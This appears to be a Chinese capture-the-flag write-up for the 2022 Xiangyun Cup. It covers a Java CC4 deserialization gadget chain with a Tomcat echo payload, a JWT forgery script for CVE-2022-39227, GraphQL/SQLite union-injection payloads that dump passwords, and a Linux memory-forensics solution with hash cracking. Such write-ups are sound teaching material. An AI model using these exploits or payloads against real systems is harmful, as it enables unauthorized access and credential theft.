# [2022祥云杯] wp




# Web

## ezjava

/myTest路由可以直接反序列化

![image-20221031103030205](https://tuchuang.huamang.xyz/img/image-20221031103030205.png)

而且存在CC4.0，可以直接cc4打

![image-20221031103020988](https://tuchuang.huamang.xyz/img/image-20221031103020988.png) 

yso本地打通，但是远程打不了，发现是不出网的，这里打一个tomcat回显就可以了，拼接上CC4利用链

```java
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;
import java.util.PriorityQueue;
import java.util.Queue;

import javax.xml.transform.Templates;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import ysoserial.payloads.util.Reflections;



public class CC4 {
    public static String base64Encode(byte[] bytes) {
        Base64.Encoder encoder = Base64.getEncoder();
        return encoder.encodeToString(bytes);
    }
    public static byte[] serialize(Object obj) throws Exception {
        ByteArrayOutputStream btout = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(btout);
        objOut.writeObject(obj);
        return btout.toByteArray();
    }

    public static Object deserialize(byte[] serialized) throws Exception {
        ByteArrayInputStream btin = new ByteArrayInputStream(serialized);
        ObjectInputStream objIn = new ObjectInputStream(btin);
        Object o = objIn.readObject();
        return o;
    }
    public static void main(String[] argss) throws Exception {
        Object templates = Evil.createTemplatesTomcatEcho();

        ConstantTransformer constant = new ConstantTransformer(String.class);

        // mock method name until armed
        Class[]  paramTypes = new Class[]{String.class};
        Object[] args       = new Object[]{"su18"};
        InstantiateTransformer instantiate = new InstantiateTransformer(
                paramTypes, args);

        // grab defensively copied arrays
        paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");
        args = (Object[]) Reflections.getFieldValue(instantiate, "iArgs");

        ChainedTransformer chain = new ChainedTransformer(new Transformer[]{constant, instantiate});

        // create queue with numbers
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(chain));
        queue.add(1);
        queue.add(1);

        // swap in values to arm
        Reflections.setFieldValue(constant, "iConstant", TrAXFilter.class);
        paramTypes[0] = Templates.class;
        args[0] = templates;

        String b64 = base64Encode(serialize(queue));
        System.out.println(b64);
    }
}

```

![image-20221031111228244](https://tuchuang.huamang.xyz/img/image-20221031111228244.png)

## Funweb

这个题目，找了好久的洞都没找到啥，后来仔细想了一下，这里用了jwt去做验证，而且获取admin权限是必须的，所以肯定得从jwt来下手，但是这里的jwt是用PS256算法的是非对称加密，不能直接爆破密钥，所以只能另寻他路，而这里爆出了个[CVE-2022-39227](https://github.com/davedoesdev/python-jwt/commit/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9)

>jwcrypto accepts both compact and JSON formats.
>It was possible to use this to present a token with arbitrary
>claims with a signature from another valid token.

而且官方直接给了测试脚本

```python
from datetime import timedelta
from json import loads, dumps
from test.common import generated_keys
from test import python_jwt as jwt
from pyvows import Vows, expect
from jwcrypto.common import base64url_decode, base64url_encode

@Vows.batch
class ForgedClaims(Vows.Context):
    """ Check we get an error when payload is forged using mix of compact and JSON formats """
    def topic(self):
        """ Generate token """
        payload = {'sub': 'alice'}
        return jwt.generate_jwt(payload, generated_keys['PS256'], 'PS256', timedelta(minutes=60))

    class PolyglotToken(Vows.Context):
        """ Make a forged token """
        def topic(self, topic):
            """ Use mix of JSON and compact format to insert forged claims including long expiration """
            [header, payload, signature] = topic.split('.')
            parsed_payload = loads(base64url_decode(payload))
            parsed_payload['sub'] = 'bob'
            parsed_payload['exp'] = 2000000000
            fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))
            return '{"  ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}'

        class Verify(Vows.Context):
            """ Check the forged token fails to verify """
            @Vows.capture_error
            def topic(self, topic):
                """ Verify the forged token """
                return jwt.verify_jwt(topic, generated_keys['PS256'], ['PS256'])

            def token_should_not_verify(self, r):
                """ Check the token doesn't verify due to mixed format being detected """
                expect(r).to_be_an_error()
                expect(str(r)).to_equal('invalid JWT format')
```

我们把我们的jwt搞上去，把is_admin换成1就ok了

```python
from datetime import timedelta
from json import loads, dumps
import python_jwt as jwt
from jwcrypto.common import base64url_decode, base64url_encode

topic = "eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NjcwOTkyNDUsImlhdCI6MTY2NzA5ODk0NSwiaXNfYWRtaW4iOjAsImlzX2xvZ2luIjoxLCJqdGkiOiJteE9oWllCWTMwYW14bEhTUW4yczRRIiwibmJmIjoxNjY3MDk4OTQ1LCJwYXNzd29yZCI6ImEiLCJ1c2VybmFtZSI6ImEifQ.YL_7_6SwdxvUJm9W9WFRpKrITke0YfQlUDKDx06hifgVp0re7u5FUYSrChtN5trfVNzcWL-I9LNbtm_oLa3MUvxjbG6zJQSFMO6idOl3Wu5nZIRfNsg4RhNHrw4bZV9gf3D7Q4QsvCPcSDT9qXHjWnafZLAJ_y_Q8iZPAqbjaBV9FJ4vu3hjPH8vzN3d-v-39vqjVoQzSGJRz6dzQiBaZ8XGTD6qK8-AZ1xF-lEd02Lo1DD3MpJDUM7XXdPqC-tUnpIWYhaXI_1WNFbZWD6RunhdMJ_Ykt4u1GF7oYRBt12Q_uU106bSdosfPBQ-O2cfF8ewNe3K-RFKJtaVMUkt6A"
[header, payload, signature] = topic.split('.')
parsed_payload = loads(base64url_decode(payload))
parsed_payload['is_admin'] = 1
parsed_payload['exp'] = 2000000000
fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))
print('{"  ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}')
```

下一步就是一个GraphQL注入，这个注入好像不算难，

直接查询报错，提示getscoreusingid，但是只能是纯数字

![image-20221031112643966](https://tuchuang.huamang.xyz/img/image-20221031112643966.png)

换成name试了一下，又报错发现这里有个getscoreusingnamehahaha

![image-20221031112728399](https://tuchuang.huamang.xyz/img/image-20221031112728399.png)

然后就可以开始查询了

查询版本

```
1'+union+select+sqlite_version()+—
```

![image-20221031112822194](https://tuchuang.huamang.xyz/img/image-20221031112822194.png)

爆出users表

```
1'+union+select+(select+name+from+sqlite_master+where+type%3d'table'+limit+0,1)+—
```

![image-20221031124115476](https://tuchuang.huamang.xyz/img/image-20221031124115476.png)

查出password`1'+union+select+(select+password+from+users)+—`

![image-20221031124138020](https://tuchuang.huamang.xyz/img/image-20221031124138020.png)

登录获取flag 

![image-20221031124148049](https://tuchuang.huamang.xyz/img/image-20221031124148049.png)



# Misc

## strange_forensics

autopsy取证题目说flag1是用户密码，这里得去找shadow，由于只能搜关键词，我就直接搜shadow的特征了`root:`确实搜得到

![image-20221031122200427](https://tuchuang.huamang.xyz/img/image-20221031122200427.png)

但是其实很多还是passwd，继续往下翻翻到了

![image-20221031122214695](https://tuchuang.huamang.xyz/img/image-20221031122214695.png)

有一个bob用户的密码，这里爆破一下就可以了`bob:$1$C5/bIl1n$9l5plqPKK4DjjqpGHz46Y/:19283:0:99999:7:::`

用hashcat爆了100万个爆破出来了

![image-20221031122232269](https://tuchuang.huamang.xyz/img/image-20221031122232269.png)

keyword扫描直接扫描出了flag3的明文`Ux_forEnsIcs_MASTER`

![image-20221031122248044](https://tuchuang.huamang.xyz/img/image-20221031122248044.png)

现在就差flag2了autopsy好像没搜到什么

![image-20221031122259487](https://tuchuang.huamang.xyz/img/image-20221031122259487.png)

strings搜了一下敏感的关键字，发现这里是有个secret.zip，而且刚好在我们刚刚获取的用户密码bob的桌面上

![image-20221031122311749](https://tuchuang.huamang.xyz/img/image-20221031122311749.png)

要dump文件出来，那就只能vol了，vol要dump出linux的东西，大概率扫不出imageinfo，所以得去自己找找系统搜了一下关键词，18.04

![image-20221031122329481](https://tuchuang.huamang.xyz/img/image-20221031122329481.png)

找到了kernel版本号：`Linux version 5.4.0-84-generic (buildd@lcy01-amd64-007)`

![image-20221031122346792](https://tuchuang.huamang.xyz/img/image-20221031122346792.png)

现在系统就找到了，`Ubuntu18.04.5 5.4.0-84-generic`然后就是去做一个同版本Ubuntu的虚拟机了，这里更换内核版本

![image-20221031122402271](https://tuchuang.huamang.xyz/img/image-20221031122402271.png)

搭建好相同环境的Ubuntu

![image-20221031122418282](https://tuchuang.huamang.xyz/img/image-20221031122418282.png)

然后就开始制作profile

![image-20221031122432394](https://tuchuang.huamang.xyz/img/image-20221031122432394.png)

![image-20221031122443065](https://tuchuang.huamang.xyz/img/image-20221031122443065.png)

然后拉进我们的vol就可以了

![image-20221031122455645](https://tuchuang.huamang.xyz/img/image-20221031122455645.png) 

就可以使用插件linux_recover_filesystem来跑出文件

```
python vol.py -f /tmp/1.mem  --profile=LinuxUbuntu_5_4_0-84-generic_profilex64 linux_recover_filesystem -D /tmp/ctf
```

这里的压缩包，打开发现是错误的

![image-20221031122554090](https://tuchuang.huamang.xyz/img/image-20221031122554090.png)

010打开分析了一下猜测是加密位被改了，这里加密位改成09，然后发现压缩包正常，但是要密码

![image-20221031122609008](https://tuchuang.huamang.xyz/img/image-20221031122609008.png)

爆破了一下，密码就是123456

![image-20221031122621898](https://tuchuang.huamang.xyz/img/image-20221031122621898.png)

拿到flag2 `_y0u_Ar3_tHe_LIn`

![image-20221031122632354](https://tuchuang.huamang.xyz/img/image-20221031122632354.png)

三个拼起来就是flag了但是交上去不对，看描述好像flag3还有点出入，又去autopsy搜了一下，果然有不一样的，这个交上去才是对的 

![image-20221031122642604](https://tuchuang.huamang.xyz/img/image-20221031122642604.png)

flag{890topico_y0u_Ar3_tHe_LInUx_forEnsIcS_MASTER}

